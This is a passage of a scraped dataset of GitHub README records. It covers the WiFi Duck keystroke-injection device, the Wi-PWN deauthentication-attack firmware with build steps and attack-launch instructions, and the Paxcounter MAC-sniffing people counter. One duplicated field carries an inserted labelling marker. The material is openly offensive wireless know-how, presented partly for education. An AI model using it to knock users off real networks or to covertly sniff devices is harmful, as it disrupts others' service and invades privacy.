vcc\ngnd gnd\n* the data pin can be changed later on in the software, pin 7 is just an example.\npcb\nto make the diy process easier, i designed a little pcb.\nyou solder a pro micro board on one side and a wemos d1 mini or nodemcu board (depending on the pcb) on the other side.\nthat's it. you don't even have to solder all pins, just the ones mentioned in connections, excluding the led.\ndesign files:\npro micro + wemos d1 mini: https://easyeda.com/spacehuhn/wifi-duck\npro micro + nodemcu: https://easyeda.com/spacehuhn/diy-wifi-duck-pro-micro-nodemcu\nyou can also order them on oshpark:\npro micro + wemos d1 mini: https://oshpark.com/shared_projects/arced9je\npro micro + nodemcu: https://oshpark.com/shared_projects/xuuuh1hb\nflash software\nwatch the video tutorial\ndownload and install the arduino ide.\nstart the arduino ide, go to file > preferences.\nat additional board manager ulrs enter https://raw.githubusercontent.com/spacehuhntech/arduino/main/package_spacehuhn_index.json. you can add multiple urls, separating them with commas.\ngo to tools > board > board manager, search for wifi duck and install wifi duck avr boards and wifi duck esp8266 boards.\ndownload and extract this repository or git clone it.\nif you can't find the com port of esp8266 board, then you're probably missing the right drivers. here are links to drivers of the 2 most used uart chips on esp8266 development boards:\n\ud83d\udcbe cp2102\n\ud83d\udcbe ch340\nflash atmega32u4\nopen atmegaduck/atmega_duck.ino with the arduino ide.\nunder tools > board in the wifi duck avr section, select your board; for example, sparkfun pro micro.\nconnect the atmega32u4 board via usb and select its port under tools > port.\noptional: under tools you can enable the led and set its pin. you can also change the usb id to make it appear as a certain type of keyboard.\npress upload.\nflash esp8266\nopen esp_duck/esp_duck.ino with the arduino ide.\nunder tools > board in the wifi duck esp8266 section, select your board. for example nodemcu 1.0 (esp-12e module).\nconnect the esp8266 board via usb and select its port under tools > port.\npress upload.\npro tip: if the esp8266 is already running this software and you just want to update it, you don't have to connect it via usb. you can update it over the air! simply connect to the wifiduck network (default password is wifiduck).\nthen in arduino at tools > port you should now see a network port. select it and press upload.\nnote: after the initial flashing, the esp8266 has to format its memory, so it might take a minute until it's fully ready.\nif you connected the rgb led:\nblue led = connection working\ngreen led = device ready\nunbrick atmega32u4\nif you flashed your atmega32u4 board with the wrong bootloader, it will no longer appear in the port selection after you connect it.\nto solve this, you need to:\nconnect the reset pin rst to ground gnd. preferably with a jumper wires, because you need to be able to disconnect it quickly.\nopen a sketch, atmegaduck/atmega_duck.ino or an empty sketch.\nmake sure to have the correct board selected under tools > board!\nconnect the board with the wire still connected.\npress upload and as soon as you see compiling... turn to uploading..., disconnect the wire.\nnow it should flash the sketch and the correct bootloader.\nscripting\nbasics\nkeys are separated by a single space.\neverything written in a single line gets pressed and released at the same time.\nto write text, use the string function.\nit's compatible to ducky script, which was developed by the wonderful people at hak5.\nexample explanation\nwindows\nr type the windows key and then the r key\nwindows r press the windows key and the r key simultaneously\nstring windows r write windows r\nfunctions\ncommand example description\nrem rem hello world! comment\ndefaultdelay or default_delay defaultdelay 200 time in ms between every command\ndelay delay 1000 delay in ms\nstring string hello world! types the following string\nrepeat or replay repeat 3 repeats the last command n times\nlocale locale de sets the keyboard layout. available: de, es, gb, us, dk, ru, fr\nkeycode keycode 0x02 0x04 types a specific key code (modifier, key1[, ..., key6]) in decimal or hexadecimal\nled led 40 20 10 changes the color of the led in decimal rgb values (0-255)\nstandard keys\nkey\na - z\na - z\n0 - 9\nf1 - f12\nmodifier keys\nkey\nctrl or control\nshift\nalt\nwindows or gui\nother keys\nkey\nenter\nmenu or app\ndelete\nhome\ninsert\npageup\npagedown\nup or uparrow\ndown or downarrow\nleft or leftarrow\nright or rightarrow\ntab\nend\nesc or escape\nspace\npause or break\ncapslock\nnumlock\nprintscreen\nscrolllock\nexamples\nrem hello world for windows pcs\ndefaultdelay 200\ngui r\nstring notepad\nenter\nstring hello world!\ncli commands\nthe command line interface or cli is accessible using a serial connection to the esp8266 (115200 baud, newline ending) or via the web interface at 192.168.4.1/terminal.html.\ngeneral\ncommand description example\nhelp returns all available commands help\nram returns available memory in bytes ram\nversion returns version number version\nsettings returns list of settings settings\nset -n/ame -v/alue sets value of a specific setting set ssid \"why fight duck\"\nreset resets all settings to their default values reset\nstatus returns status of i2c connection with atmega32u4 status\nrun <...> starts executing a ducky script run example.txt\nstop <...> stops executing a ducky script stop example.txt\nspiffs file management\ncommand description example\nmem returns available, used and free memory of spiffs in bytes mem\nformat formats spiffs format\nls <...> returns list of files ls /\ncreate <...> creates file create example.duck\nremove <...> deletes file remove example.duck\ncat <...> returns content of file cat example.duck\nrename -filea,a -fileb,b renames file rename example.duck example.txt\nwrite -f/ile -c/ontent writes (appends) data to file write example.txt \"hello world!\"\nstream <...> opens file stream stream example.txt\nclose closes file stream close\nread read and return the result from file stream read\nif a stream is open, everything you type (except messages containing exactly close or read) will be written to the file until you type close!\nhow to debug\nto properly debug, you need to have both the atmega32u4 and the esp8266 connected via usb to your computer.\nthat can be tricky when you only have a all in one board, so it might be useful you built one yourself. you don't need to solder it, for example you can use an arduino leonardo and a nodemcu and connect them with jumper cables.\nnow open 2 instances of arduino (so they run as separate processes!), select the com port and open the serial monitor for each device. you might need to reset the atmega32u4 to see serial output. if that causes problems with the i2c connection, try to reset the esp8266 too.\ndevelopment\nedit web files\nif you would like to modify the web interface, you can!\nthe web/ folder contains all .html, .css, .js files.\nyou can edit and test them locally as long as you're connected to the wifi duck network thanks to the websocket connection handled by javascript in the background.\nto get the new files onto the esp8266, run python3 webconverter.py in the repository folder.\nit gzips all files inside web/, converts them into a hex array and saves it in esp_duck/webfiles.h.\nnow you just need to flash the esp8266 again.\ntranslate keyboard layout\ncurrently supported keyboard layouts:\n\ud83c\udde9\ud83c\uddea de\n\ud83c\uddec\ud83c\udde7 gb\n\ud83c\uddfa\ud83c\uddf8 us\n\ud83c\uddea\ud83c\uddf8 es\n\ud83c\udde9\ud83c\uddf0 dk\n\ud83c\uddf7\ud83c\uddfa ru\n\ud83c\uddeb\ud83c\uddf7 fr\n\ud83c\udde7\ud83c\uddea be (ascii only)\n\ud83c\uddf5\ud83c\uddf9 pt (ascii only)\n\ud83c\uddee\ud83c\uddf9 it\n\ud83c\uddf8\ud83c\uddf0 sk\n\ud83c\udde8\ud83c\uddff cz\nall standard keys are defined in usb_hid_keys.h.\nto translate a keyboard layout, you have to match each character on your keyboard to the one(s) of a us keyboard.\nthis stuff is hard to explain in writing and requires a lot of manual work and testing.\ncopy one of the existing layouts files, like locale_us.h.\npreferably one that is close to your keyboard layout, it will save you time!\nadd #include \"locale_xx.h\" to the end of the locales.h file.\nrename the file and its variables to your language code. for example:\nlocale_xx.h -> locale_de.h,\nascii_xx -> ascii_de,\nlocale_xx -> locale_de,\nextended_ascii_xx -> extended_ascii_de,\nutf8_xx -> utf8_de.\nmodify the ascii array.\nthe ascii array has a fixed size. each row describes a key. first a modifier key like key_mod_lshift, then a character key. some ascii characters can't be typed or don't require a modifier, that's where you must place key_none. check usb_hid_keys.h for the available keys.\nif multiple modifiers are required, you must use a bitwise or to connect them: key_mod_ralt | key_mod_lshift.\nfor example, in locale_de.h z is saved as key_mod_lshift, key_y.\nthis is because german keyboards use qwertz instead of the qwerty layout and since the letter is uppercase, shift must be pressed as well.\nthankfully you don't have to trial and error everything, the hak5 community translated a lot of layouts already here. it's just written in a different syntax. for example, ascii_20 (20 in hexadecimal) is the 32th character in our ascii array.\nmodify or create the extended ascii array.\nthe extended ascii array doesn't have a fixed size and is only as long as you make it. first the character code. for example, \u00e4 has the index 132, or 84 in hex. it doesn't use a modifier and sits where the apostrophe key is on a us keyboard: 0x84, key_none, key_apostrophe, // \u00e4.\nmodify or create the utf-8 array.\nthe utf-8 array is variable in length, too.\nthe first 4 bytes are the character code.\nfor example, \u00e4 has the hex code c384 or 0xc3 0x84. the other 2 bytes are not used so we set them to 0. because the letter is uppercase, we need to press the shift key and like before, the letter is typed by pressing the same key as the apostrophe key of a us keyboard: 0xc3, 0x84, 0x00, 0x00, key_mod_lshift, key_apostrophe, // \u00e4.\nedit the hid_locale_t structure.\nif you renamed all variables accordingly, there's nothing left to do.\ngo to duckparser.cpp at // locale (-> change keyboard layout) you can see a bunch of else if statements. you need to copy one for your layout.\nbefore adding gb layout:\nif (compare(w->str, w->len, \"us\", case_sensetive)) {\nkeyboard::setlocale(&locale_us);\n} else if (compare(w->str, w->len, \"de\", case_sensetive)) {\nkeyboard::setlocale(&locale_de);\n}\nafter adding gb layout:\nif (compare(w->str, w->len, \"us\", case_sensetive)) {\nkeyboard::setlocale(&locale_us);\n} else if (compare(w->str, w->len, \"de\", case_sensetive)) {\nkeyboard::setlocale(&locale_de);\n} else if (compare(w->str, w->len, \"gb\", case_sensetive)) {\nkeyboard::setlocale(&locale_gb);\n}\ntest your layout with a ducky script that contains all characters of your keyboard. for example:\nlocale de\nstring !\"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_abcdefghijklmnopqrstuvwxyz{|}~\u00b2\u00b3\u00e4\u00f6\u00fc\u00e4\u00f6\u00fc\u00df\u20ac\u00b0\u00a7`\nenter\nadd a link to your layout to readme, to web/index.html and please feel free to improve this tutorial to help future translators!\ncreate a pull request\ndisclaimer\nthis tool is intended to be used for testing, training, and educational purposes only.\nnever use it to do harm or create damage!\nthe continuation of this project counts on you!\nlicense\nthis software is licensed under the mit license. see the license file for details.\ncredits\nsoftware libraries used in this project:\narduino\nneopixel library\ndotstar library\navr, esp8266 & samd arduino core\nespasynctcp\nespasyncwebserver\nsimplecli", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000044, "year": null}, {"Unnamed: 0": 2086, "autor": 46, "date": null, "content": "Wi-PWN\nESP8266 firmware for performing deauthentication attacks, with ease.\nFast & responsive Material Design UI, with optional dark mode\nIntegrated Deauth Detector (with full customization)\nWiFi client mode - Access Wi-PWN on a WiFi network\nInfo page with total packets sent, uptime, memory usage, check for updates...\nEasy to use translation engine - want to translate it to your own language? Simply go over here and ask!\nTable of Contents\nIntroduction\nWhat is Wi-PWN\nHow it works\nHow to protect against it\nInstallation\nFlashing with NodeMCU-Flasher\nCompiling with Arduino\nHow to use it\nFAQ\nLicense\nSources and additional links\nIntroduction\nWhat is Wi-PWN\nWi-PWN is a firmware that performs deauth attacks on cheap Arduino boards. The ESP8266 is a cheap micro controller with built-in Wi-Fi. It contains a powerful 160 MHz processor and it can be programmed using Arduino.\nA deauthentication attack is often confused with Wi-Fi jamming, as they both block users from accessing Wi-Fi networks.\nHow it works\nThe 802.11 Wi-Fi protocol contains a so called deauthentication frame. It is used to disconnect clients safely from a wireless network.\nBecause these management packets are unencrypted, you just need the MAC address of the Wi-Fi router and of the client device which you want to disconnect from the network. You don\u2019t need to be in the network or know the password, it\u2019s enough to be in its range.\nHow to protect against it\nWith the 802.11w-2009 updated standards, management frames are encrypted by default.\n802.11w is rarely used in the real world as both the router and the client device need to support this standard, otherwise they won't be able to connect to the routers.\nUpdating to the 802.11w standard is often expensive and difficult due to the vast devices of legacy devices not supporting the new standard. Because of the maintenance nightmare, over 95% of devices use the vulnerable 802.11 standard \u2014 even though newer devices support newer standards.\nInstallation\nRequirements:\nESP8266 module (any board)\nMicro-USB cable\nComputer\nI would recommend getting a USB breakout/developer board, mainly due to the 4Mb of flash and simplicity.\nIn order to upload the Wi-PWN firmware, you can use one of two methods. The first method is easier overall but using Arduino is better for debugging. YOU ONLY NEED TO DO ONE OF THE INSTALLATION METHODS!\nInstall the necessary drivers\nThere are two variants of UART converters that ESP8266 boards use:\nCP210x CH34x\nDrivers Drivers\nMethod 1: Flashing with NodeMCU-Flasher\nDownload the current release of Wi-PWN\nUpload the .bin file using the nodemcu-flasher. Alternatively you can use the official esptool from espressif.\nConnect your ESP8266 (making sure the drivers are installed) and open up the NodeMCU Flasher\nGo to the Advanced tab and select the correct values for your board.\nNavigate to the config tab and click the gear icon for the first entry.\nBrowse for the .bin file you just downloaded and click open.\nSwitch back to the Operation tab and click Flash(F).\nMethod 2: Compiling with Arduino\nDownload the source code of this project.\nInstall Arduino and open it.\nGo to File > Preferences\nAdd http://arduino.esp8266.com/stable/package_esp8266com_index.json to the Additional Boards Manager URLs. (refer to https://github.com/esp8266/Arduino)\nGo to Tools > Board > Boards Manager\nType in esp8266\nSelect version 2.0.0 and click on Install (must be version 2.0.0!)\nGo to File > Preferences\nOpen the folder path under More preferences can be edited directly in the file\nGo to packages > esp8266 > hardware > esp8266 > 2.0.0 > tools > sdk > include\nOpen user_interface.h with a text editor\nJust before the last line #endif, add the following:\ntypedef void (*freedom_outside_cb_t)(uint8 status);\nint wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);\nvoid wifi_unregister_send_pkt_freedom_cb(void);\nint wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);\nGo to the arduino/SDK_fix folder of this project\nCopy ESP8266Wi-Fi.cpp and ESP8266Wi-Fi.h to C:\\Users\\%username%\\AppData\\Local\\Arduino15\\packages\\esp8266\\hardware\\esp8266\\2.0.0\\libraries\\ESP8266WiFi\\src\nOpen arduino/Wi-PWN/Wi-PWN.ino in Arduino\nSelect your ESP8266 board at Tools > Board and the right port at Tools > Port If no port shows up you need to reinstall the drivers, search online for chip part number + 'driver Windows'\nDepending on your board you may have to adjust the Tools > Board > Flash Frequency and the Tools > Board > Flash Size. I used the 80MHz Flash Frequency, and the 4M (1M SPIFFS) Flash Size\nUpload! CTRL-U\nNote: If you use a 512kb version of the ESP8266, you need to comment out a part of the mac vendor list in data.h\nHow to use\nConnect your ESP8266 to a USB power source (you can power it with your phone using an OTG cable)\nScan for Wi-Fi networks on your device and connect to Wi-PWN (no password by default).\nOnce connected, open up your browser and go to http://192.168.4.1\nClick on ACCEPT to accept the Terms & Conditions\nSpecify a SSID and password for Wi-PWN to use and click on CONTINUE\nReconnect to the new network using the SSID & Password you specified in the previous step.\nGo back to your browser and the page should reload (open http://192.168.4.1 again if the page doesn't reload)\nClick on the Scan button to scan for Wi-Fi networks\nNote: You may have to reconnect to the Wi-Fi network.\nSelect the WiFi network(s) you want to perform the attack on. Once finished, click on the Attack button\nSelect the attack you wish to perform\nFAQ\nOnly able to connect to Wi-Fi network on some devices\nThis happens due to a channel conflict. Simply navigate to 192.168.4.1/settings.html on a device that is able to connect to the Wi-Fi network and change the Channel number from 1 to any number up to 14.\nespcomm_sync failed / espcomm_open when uploading\nThe ESP upload tool can't communicate with the chip.\nReconnect the chip using a different USB port and cable.\nInstall the USB drivers (cp2102 or ch340).\nMake sure the right COM port is selected.\nSSID's wont load? (No clear button)\nTry resetting the SSID list by visiting 192.168.4.1/clearSSID.json while connected to your ESP. If this doesnt solve your problem, ask for help in the official discord.\nDeauth attack won't work\nIf you see 0 pkts/s on the website, then you've made a mistake. Check that you have followed the installation steps correctly and that the right SDK installed, it must be version 2.0.0! If it can send packets but your target doesn't lose its connection, then the Wi-Fi router either uses 802.11w and it's protected against such attacks, or it communicates on the 5GHz band, which the ESP8266 doesn't support because of its 2.4GHz antenna.\nIf you have other questions or problems with the ESP8266 you can also check out the official community forum.", "link": "https://github.com/samdenty/Wi-PWN", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "wi-pwn\nesp8266 firmware for performing deauthentication attacks, with ease.\nfast & responsive material design ui, with optional dark mode\nintegrated deauth detector (with full customization)\nwifi client mode - access wi-pwn on a wifi network\ninfo page with total packets sent, uptime, memory usage, check for updates...\neasy to use translation engine - want to translate it to your own language? simply go over here and ask!\ntable of contents\nintroduction\nwhat is wi-pwn\nhow it works\nhow to protect against it\ninstallation\nflashing with nodemcu-flasher\ncompiling with arduino\nhow to use it\nfaq\nlicense\nsources and additional links\nintroduction\nwhat is wi-pwn\nwi-pwn is a firmware that performs deauth attacks on cheap arduino boards. the esp8266 is a cheap micro controller with built-in wi-fi. it contains a powerful 160 mhz processor and it can be programmed using arduino.\na deauthentication attack is often confused with wi-fi jamming, as they both block users from accessing wi-fi networks.\nhow it works\nthe 802.11 wi-fi protocol contains a so called deauthentication frame. it is used to disconnect clients safely from a wireless network.\nbecause these management packets are unencrypted, you just need the mac address of the wi-fi router and of the client device which you want to disconnect from the network. you don\u2019t need to be in the network or know the password, it\u2019s enough to be in its range.\nhow to protect against it\nwith the 802.11w-2009 updated standards, management frames are encrypted by default.\n802.11w is rarely used in the real world as both the router and the client device need to support this standard, otherwise they won't be able to connect to the routers.\nupdating to the 802.11w standard is often expensive and difficult due to the vast devices of legacy devices not supporting the new standard. because of the maintenance nightmare, over 95% of devices use the vulnerable 802.11 standard \u2014 even though newer devices support newer standards.\ninstallation\nrequirements:\nesp8266 module (any board)\nmicro-usb cable\ncomputer\ni would recommend getting a usb breakout/developer board, mainly due to the 4mb of flash and simplicity.\nin order to upload the wi-pwn firmware, you can use one of two methods. the first method is easier overall but using arduino is better for debugging. you only need to do one of the installation methods!\ninstall the necessary drivers\nthere are two variants of uart converters that esp8266 boards use:\ncp210x ch34x\ndrivers drivers\nmethod 1: flashing with nodemcu-flasher\ndownload the current release of wi-pwn\nupload the .bin file using the nodemcu-flasher. alternatively you can use the official esptool from espressif.\nconnect your esp8266 (making sure the drivers are installed) and open up the nodemcu flasher\ngo to the advanced tab and select the correct values for your board.\nnavigate to the config tab and click the gear icon for the first entry.\nbrowse for the .bin file you just downloaded and click open.\nswitch back to the operation tab and click flash(f).\nmethod 2: compiling with arduino\ndownload the source code of this project.\ninstall arduino and open it.\ngo to file > preferences\nadd http://arduino.esp8266.com/stable/package_esp8266com_index.json to the additional boards manager urls. (refer to https://github.com/esp8266/arduino)\ngo to tools > board > boards manager\ntype in esp8266\nselect version 2.0.0 and click on install (must be version 2.0.0!)\ngo to file > preferences\nopen the folder path under more preferences can be edited directly in the file\ngo to packages > esp8266 > hardware > esp8266 > 2.0.0 > tools > sdk > include\nopen user_interface.h with a text editor\njust before the last line #endif, add the following:\ntypedef void (*freedom_outside_cb_t)(uint8 status);\nint wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);\nvoid wifi_unregister_send_pkt_freedom_cb(void);\nint wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);\ngo to the arduino/sdk_fix folder of this project\ncopy esp8266wi-fi.cpp and esp8266wi-fi.h to c:\\users\\%username%\\appdata\\local\\arduino15\\packages\\esp8266\\hardware\\esp8266\\2.0.0\\libraries\\esp8266wifi\\src\nopen arduino/wi-pwn/wi-pwn.ino in arduino\nselect your esp8266 board at tools > board and the right port at tools > port if no port shows up you need to reinstall the drivers, search online for chip part number + 'driver windows'\ndepending on your board you may have to adjust the tools > board > flash frequency and the tools > board > flash size. i used the 80mhz flash frequency, and the 4m (1m spiffs) flash size\nupload! ctrl-u\nnote: if you use a 512kb version of the esp8266, you need to comment out a part of the mac vendor list in data.h\nhow to use\nconnect your esp8266 to a usb power source (you can power it with your phone using an otg cable)\nscan for wi-fi networks on your device and connect to wi-pwn (no password by default).\nonce connected, open up your browser and go to http://192.168.4.1\nclick on accept to accept the terms & conditions\nspecify a ssid and password for wi-pwn to use and click on continue\nreconnect to the new network using the ssid & password you specified in the previous step.\ngo back to your browser and the page should reload (open http://192.168.4.1 again if the page doesn't reload)\nclick on the scan button to scan for wi-fi networks\nnote: you may have to reconnect to the wi-fi network.\nselect the wifi network(s) you want to perform the attack on. once finished, click on the attack button\nselect the attack you wish to perform\nfaq\nonly able to connect to wi-fi network on some devices\nthis happens due to a channel conflict. simply navigate to 192.168.4.1/settings.html on a device that is able to connect to the wi-fi network and change the channel number from 1 to any number up to 14.\nespcomm_sync failed / espcomm_open when uploading\nthe esp upload -----> tool !!!  can't communicate with the chip.\nreconnect the chip using a different usb port and cable.\ninstall the usb drivers (cp2102 or ch340).\nmake sure the right com port is selected.\nssid's wont load? (no clear button)\ntry resetting the ssid list by visiting 192.168.4.1/clearssid.json while connected to your esp. if this doesnt solve your problem, ask for help in the official discord.\ndeauth attack won't work\nif you see 0 pkts/s on the website, then you've made a mistake. check that you have followed the installation steps correctly and that the right sdk installed, it must be version 2.0.0! if it can send packets but your target doesn't lose its connection, then the wi-fi router either uses 802.11w and it's protected against such attacks, or it communicates on the 5ghz band, which the esp8266 doesn't support because of its 2.4ghz antenna.\nif you have other questions or problems with the esp8266 you can also check out the official community forum.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000046, "year": null}, {"Unnamed: 0": 2088, "autor": 48, "date": null, "content": "ESP32-Paxcounter\nWifi & Bluetooth driven, LoRaWAN enabled, battery powered mini Paxcounter built on cheap ESP32 LoRa IoT boards\nTutorial (in german language): https://www.heise.de/select/make/2019/1/1551099236518668\nUse case\nPaxcounter is an ESP32 MCU based device for metering passenger flows in realtime. It counts how many mobile devices are around. This gives an estimation how many people are around. Paxcounter detects Wifi and Bluetooth signals in the air, focusing on mobile devices by evaluating their MAC adresses.\nIntention of this project is to do this without intrusion in privacy: You don't need to track people owned devices, if you just want to count them. Therefore, Paxcounter does not persistenly store MAC adresses and does no kind of fingerprinting the scanned devices.\nData can either be be stored on a local SD-card, transferred to cloud using LoRaWAN network or MQTT over TCP/IP, or transmitted to a local host using serial (SPI) interface.\nYou can build this project battery powered using ESP32 deep sleep mode and reach long uptimes with a single 18650 Li-Ion cell.\nHardware\nSupported ESP32 based boards:\nLoRa & SPI:\nHeltec: LoRa-32 v1 and v2\nTTGO: Paxcounter-Board*, T1*, T2*, T3*, T-Beam, T-Fox\nPycom: LoPy, LoPy4, FiPy\nRadioshuttle.de: ECO Power Board\nWeMos: LoLin32 + LoraNode32 shield, LoLin32lite + LoraNode32-Lite shield\nAdafruit ESP32 Feather + LoRa Wing + OLED Wing, #IoT Octopus32 (Octopus + ESP32 Feather)\nM5Stack: Basic Core IoT* + Lora Module RA-01H, Fire IoT*\n*) supports microSD-card\nSPI only:\nPyom: WiPy\nWeMos: LoLin32, LoLin32 Lite, WeMos D32, Wemos32 Oled\nCrowdsupply: TinyPICO\nTTGO: T-Display\nTTGO: T-Wristband\nGeneric ESP32\nDepending on board hardware following features are supported:\nLoRaWAN communication, supporting various payload formats (see enclosed .js converters)\nMQTT communication via TCP/IP and Ethernet interface (note: payload transmitted over MQTT will be base64 encoded)\nSPI serial communication to a local host\nLED (shows power & status)\nOLED Display (shows detailed status)\nRGB LED (shows colorized status)\nButton (short press: flip display page / long press: send alarm message)\nBattery voltage monitoring (analog read / AXP192 / IP5306)\nGPS (Generic serial NMEA, or Quectel L76 I2C)\nEnvironmental sensors (Bosch BMP180/BME280/BME680 I2C; SDS011 serial)\nReal Time Clock (Maxim DS3231 I2C)\nIF482 (serial) and DCF77 (gpio) time telegram generator\nSwitch external power / battery\nLED Matrix display (similar to this 64x16 model, can be ordered on Aliexpress)\nSD-card (see section SD-card here) for logging pax data\nTarget platform must be selected in platformio.ini.\nHardware dependent settings (pinout etc.) are stored in board files in /hal directory. If you want to use a ESP32 board which is not yet supported, use hal file generic.h and tailor pin mappings to your needs. Pull requests for new boards welcome.\nSome 3D printable cases can be found (and, if wanted so, ordered) on Thingiverse, see Heltec, TTGOv2, TTGOv2.1, TTGO, T-BEAM, T-BEAM parts, for example.\nPower consumption was metered at around 450 - 1000mW, depending on board and user settings in paxcounter.conf. By default bluetooth sniffing not installed (#define BLECOUNTER 0 in paxcounter.conf). Installing and enabling bluetooth costs 30% more power + 30% flash storage for the software stack. If you enable bluetooth be aware that this goes on expense of wifi sniffing results, because then wifi and bt stack must share the 2,4 GHz RF ressources of ESP32. If you need to sniff wifi and bt in parallel and need best possible results, use two boards - one for wifi only and one for bt only - and add counted results.\nPreparing\nInstall Platformio\nInstall PlatformIO IDE for embedded development to make this project. Platformio integrates with your favorite IDE, choose eg. Visual Studio, Atom, Eclipse etc.\nCompile time configuration is spread across several files. Before compiling the code, edit or create the following files:\nplatformio.ini\nEdit platformio_orig.ini and select desired hardware target in section boards. To add a new board, create an appropriate hardware abstraction layer file in hal subdirectory, and add a pointer to this file in sections board. Copy or rename to platformio.ini in the root directory of the project. Now start Platformio. Note: Platformio is looking for platformio.ini in the root directory and won't start if it does not find this file.\npaxcounter.conf\nEdit src/paxcounter_orig.conf and tailor settings in this file according to your needs and use case. Please take care of the duty cycle regulations of the LoRaWAN network you're going to use. Copy or rename to src/paxcounter.conf.\nIf your device has a real time clock it can be updated bei either LoRaWAN network or GPS time, according to settings TIME_SYNC_INTERVAL and TIME_SYNC_LORAWAN in paxcounter.conf.\nsrc/lmic_config.h\nEdit src/lmic_config.h and tailor settings in this file according to your country and device hardware. Please take care of national regulations when selecting the frequency band for LoRaWAN.\nsrc/loraconf.h\nCreate file src/loraconf.h using the template src/loraconf_sample.h and adjust settings to use your personal values. To join the network and activate your paxcounter, you must configure either OTAA or ABP join method. You should use OTAA, whenever possible. To understand the differences of the two methods, this article may be useful.\nTo configure OTAA, leave #define LORA_ABP deactivated (commented). To use ABP, activate (uncomment) #define LORA_ABP in the file src/loraconf.h. The file src/loraconf_sample.h contains more information about the values to provide.\nsrc/ota.conf\nCreate file src/ota.conf using the template src/ota.sample.conf and enter your WIFI network&key. These settings are used for downloading updates via WiFi, either from a remote https server, or locally via WebUI. If you want to use a remote server, you need a PAX.express repository. Enter your PAX.express credentials in ota.conf. If you don't need wireless firmware updates just rename ota.sample.conf to ota.conf.\nBuilding\nUse PlatformIO with your preferred IDE for development and building this code. Make sure you have latest PlatformIO version.\nUploading\nby cable, via USB/UART interface: To upload the code via cable to your ESP32 board this needs to be switched from run to bootloader mode. Boards with USB bridge like Heltec and TTGO usually have an onboard logic which allows soft switching by the upload tool. In PlatformIO this happenes automatically.\nThe LoPy/LoPy4/FiPy board needs to be set manually. See these instructions how to do it. Don't forget to press on board reset button after switching between run and bootloader mode.\nThe original Pycom firmware is not needed, so there is no need to update it before flashing Paxcounter. Just flash the compiled paxcounter binary (.elf file) on your LoPy/LoPy4/FiPy. If you later want to go back to the Pycom firmware, download the firmware from Pycom and flash it over.\nover the air (OTA), download via WiFi: After the ESP32 board is initially flashed and has joined a LoRaWAN network, the firmware can update itself by OTA. This process is kicked off by sending a remote control command (see below) via LoRaWAN to the board. The board then tries to connect via WiFi to a cloud service (PAX.express), checks for update, and if available downloads the binary and reboots with it. If something goes wrong during this process, the board reboots back to the current version. Prerequisites for OTA are: 1. You own a PAX.express repository, 2. you pushed the update binary to your PAX.express repository, 3. internet access via encrypted (WPA2) WiFi is present at the board's site, 4. WiFi credentials were set in ota.conf and initially flashed to the board. Step 2 runs automated, just enter the credentials in ota.conf and set upload_protocol = custom in platformio.ini. Then press build and lean back watching platformio doing build and upload.\nover the air (OTA), upload via WiFi: If option BOOTMENU is defined in paxcounter.conf, the ESP32 board will try to connect to a known WiFi access point each time cold starting (after a power cycle or a reset), using the WiFi credentials given in ota.conf. Once connected to the WiFi it will fire up a simple webserver, providing a bootstrap menu waiting for a user interaction (pressing \"START\" button in menu). This process will time out after BOOTDELAY seconds, ensuring booting the device to runmode. Once a user interaction in bootstrap menu was detected, the timeout will be extended to BOOTTIMEOUT seconds. During this time a firmware upload can be performed manually by user, e.g. using a smartphone in tethering mode providing the firmware upload file.\nLegal note\nDepending on your country's laws it may be illegal to sniff wireless networks for MAC addresses. Please check and respect your country's laws before using this code!\n(e.g. US citizens may want to check Section 18 U.S. Code \u00a7 2511 and discussion on this)\n(e.g. UK citizens may want to check Data Protection Act 1998 and GDPR 2018)\n(e.g. Citizens in the the Netherlands and EU may want to read this article and this article) and this decision\n(e.g. Citizens in Germany may want to read this article of Wissenschaftliche Dienste des Deutschen Bundestages\nNote: If you use this software you do this at your own risk. That means that you alone - not the authors of this software - are responsible for the legal compliance of an application using this or build from this software and/or usage of a device created using this software. You should take special care and get prior legal advice if you plan metering passengers in public areas and/or publish data drawn from doing so.\nPrivacy disclosure\nPaxcounter generates identifiers for sniffed Wifi or Bluetooth MAC adresses and and collects them temporary in the device's RAM for a configurable scan cycle time (default 60 seconds). After each scan cycle the collected identifiers are cleared. Identifiers are generated by using the last 2 bytes of universal MAC adresses. Personal MAC adresses remain untouched and are not evaluated. Identifiers and MAC adresses are never transferred to the LoRaWAN network. No persistent storing of MAC adresses, identifiers or timestamps and no other kind of analytics than counting are implemented in this code. Wireless networks are not touched by this code, but MAC adresses from wireless devices as well within as not within wireless networks, regardless if encrypted or unencrypted, are sniffed and processed by this code.\nLED blink pattern\nMono color LED:\nSingle Flash (50ms): seen a new Wifi or BLE device\nQuick blink (20ms on each 1/5 second): joining LoRaWAN network in progress or pending\nSmall blink (10ms on each 1/2 second): LoRaWAN data transmit in progress or pending\nLong blink (200ms on each 2 seconds): LoRaWAN stack error\nRGB LED:\nGreen: seen a new Wifi device\nMagenta: seen a new BLE device\nYellow: joining LoRaWAN network in progress or pending\nPink: LORAWAN MAC transmit in progress\nBlue: LoRaWAN data transmit in progress or pending\nRed: LoRaWAN stack error\nDisplay\nIf you're using a device with OLED display, or if you add such one to the I2C bus, the device shows live data on the display. You can flip display pages showing\nrecent count of pax\nhistogram\nGPS data\nBME sensor data\ntime of day\nblank page\nby pressing the button of the device.\nSensors and Peripherals\nYou can add up to 3 user defined sensors. Insert your sensor's payload scheme in sensor.cpp. Bosch BMP180 / BME280 / BME680 environment sensors are supported, to activate configure BME in board's hal file before build. Furthermore, SDS011, RTC DS3231, generic serial NMEA GPS, I2C LoPy GPS are supported, and to be configured in board's hal file. See generic.h for all options and for proper configuration of BME280/BME680.\nOutput of user sensor data can be switched by user remote control command 0x14 sent to Port 2.\nOutput of sensor and peripheral data is internally switched by a bitmask register. Default mask can be tailored by editing cfg.payloadmask initialization value in configmanager.cpp following this scheme:\nBit Sensordata Default\n0 Paxcounter on\n1 unused off\n2 BME280/680 on\n3 GPS* on\n4 User sensor 1 on\n5 User 